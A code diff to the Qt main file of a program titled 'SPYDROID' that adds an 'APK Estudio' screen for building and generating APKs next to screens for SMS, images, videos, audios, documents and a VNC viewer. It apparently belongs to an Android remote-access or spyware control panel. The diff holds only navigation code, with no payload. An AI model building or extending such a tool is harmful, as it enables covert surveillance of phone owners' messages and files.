@@ -16,15 +16,7 @@
  */
 
 
-#include "res/bin/vnc_viewer.h"
-#include "presentation/HomeScreen.h"
-#include "presentation/DashBoardScreen.h"
-#include "presentation/SmsScreen.h"
-#include "presentation/MultimediaScreen.h"
-#include "presentation/ImagesScreen.h"
-#include "presentation/VideosScreen.h"
-#include "presentation/AudiosScreen.h"
-#include "presentation/DocumentsScreen.h"
+
 #include <QApplication>
 #include <QFile>
 #include <QPointer>
@@ -33,11 +25,23 @@
 #include <QDebug>
 #include <fstream>
 #include <unistd.h> 
+#include "res/bin/vnc_viewer.h"
+#include "presentation/HomeScreen.h"
+#include "presentation/DashBoardScreen.h"
+#include "presentation/ApkStudioScreen.h"
+#include "presentation/SmsScreen.h"
+#include "presentation/MultimediaScreen.h"
+#include "presentation/ImagesScreen.h"
+#include "presentation/VideosScreen.h"
+#include "presentation/AudiosScreen.h"
+#include "presentation/DocumentsScreen.h"
 
 // Widget indices
 enum ScreenIndex {
     HomeScreenIndex = 0,
     DashBoardScreenIndex,
+    BuildApkScreenIndex,
+    GenerateApkScreenIndex,
     MultimediaScreenIndex,
     SmsScreenIndex,
     ImagesScreenIndex,
@@ -77,6 +81,7 @@ int main(int argc, char *argv[]) {
     // Using QPointer to manage widget lifetime automatically
     QPointer<HomeScreen> homeScreen = new HomeScreen(&stackedWidget);
     QPointer<DashBoardScreen> dashBoardScreen = new DashBoardScreen(&stackedWidget);  // Corrected class name
+    QPointer<ApkStudioScreen> apkStudioScreen = new ApkStudioScreen(&stackedWidget);
     QPointer<SmsScreen> smsScreen = new SmsScreen(&stackedWidget);
     QPointer<MultimediaScreen> multimediaScreen = new MultimediaScreen(&stackedWidget);
     QPointer<ImagesScreen> imagesScreen = new ImagesScreen(&stackedWidget);
@@ -85,14 +90,15 @@ int main(int argc, char *argv[]) {
     QPointer<DocumentsScreen> documentsScreen = new DocumentsScreen(&stackedWidget);
 
     // Add widgets to QStackedWidget
-    stackedWidget.addWidget(homeScreen);          // Index 0
-    stackedWidget.addWidget(dashBoardScreen);     // Index 1 
-    stackedWidget.addWidget(multimediaScreen);    // Index 2
-    stackedWidget.addWidget(smsScreen);           // Index 3
-    stackedWidget.addWidget(imagesScreen);        // Index 4
-    stackedWidget.addWidget(videosScreen);        // Index 5
-    stackedWidget.addWidget(audiosScreen);        // Index 6
-    stackedWidget.addWidget(documentsScreen);     // Index 7
+    stackedWidget.addWidget(homeScreen);            // Index 0
+    stackedWidget.addWidget(dashBoardScreen);       // Index 1 
+    stackedWidget.addWidget(apkStudioScreen);             // Index 2
+    stackedWidget.addWidget(multimediaScreen);      // Index 3
+    stackedWidget.addWidget(smsScreen);             // Index 4
+    stackedWidget.addWidget(imagesScreen);          // Index 5
+    stackedWidget.addWidget(videosScreen);          // Index 6
+    stackedWidget.addWidget(audiosScreen);          // Index 7
+    stackedWidget.addWidget(documentsScreen);       // Index 8
 
     // Show the initial view
     stackedWidget.setCurrentIndex(HomeScreenIndex);
@@ -103,6 +109,11 @@ int main(int argc, char *argv[]) {
     QObject::connect(homeScreen, &HomeScreen::goToDashBoard, [&stackedWidget, dashBoardScreen]() {
         navigateTo(dashBoardScreen, stackedWidget, "Panel de control");
     });
+
+    QObject::connect(homeScreen, &HomeScreen::goToBuildApk, [&stackedWidget, apkStudioScreen] () {
+        navigateTo(apkStudioScreen, stackedWidget, "APK Estudio");
+    });
+
 
     QObject::connect(dashBoardScreen, &DashBoardScreen::goToHome, [&stackedWidget, homeScreen]() {
         navigateTo(homeScreen, stackedWidget, "SPYDROID");
@@ -182,6 +193,10 @@ int main(int argc, char *argv[]) {
 
     QObject::connect(documentsScreen, &DocumentsScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
         navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
+    });
+
+    QObject::connect(apkStudioScreen, &ApkStudioScreen::goToHome, [&stackedWidget, homeScreen] () {
+        navigateTo(homeScreen, stackedWidget, "Panel de control");
     });
 
     return app.exec();
